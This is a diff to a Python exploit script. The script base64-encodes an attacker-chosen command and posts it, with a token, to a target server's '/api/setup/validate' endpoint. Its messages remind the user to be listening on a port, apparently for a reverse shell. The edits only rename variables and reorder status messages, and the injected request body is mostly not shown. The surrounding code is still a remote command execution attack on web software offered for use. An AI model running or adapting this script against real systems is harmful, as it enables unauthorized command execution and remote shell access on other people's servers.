@@ -6,7 +6,7 @@ import random
 import requests
 
 
-def encode_payload_to_b64(payload: str) -> str:
+def encode_command_to_b64(payload: str) -> str:
     encoded_payload = base64.b64encode(payload.encode('ascii')).decode()
     equals_count = encoded_payload.count('=')
 
@@ -28,9 +28,9 @@ print('[!] BE SURE TO BE LISTENING ON THE PORT YOU DEFINED IF YOU ARE ISSUING AN
 
 print('[+] Initialized script')
 
-command = encode_payload_to_b64(args.command)
+print('[+] Encoding command')
 
-print('[+] Payload encoded')
+command = encode_command_to_b64(args.command)
 
 url = f'{args.url}/api/setup/validate'
 
@@ -39,7 +39,7 @@ headers = {
     "Connection": "close"
 }
 
-data = {
+payload = {
     "token": args.token,
     "details": {
         "details": {
@@ -54,6 +54,6 @@ data = {
 
 print('[+] Making request')
 
-request = requests.post(url, json=data, headers=headers)
+request = requests.post(url, json=payload, headers=headers)
 
 print('[+] Payload sent')
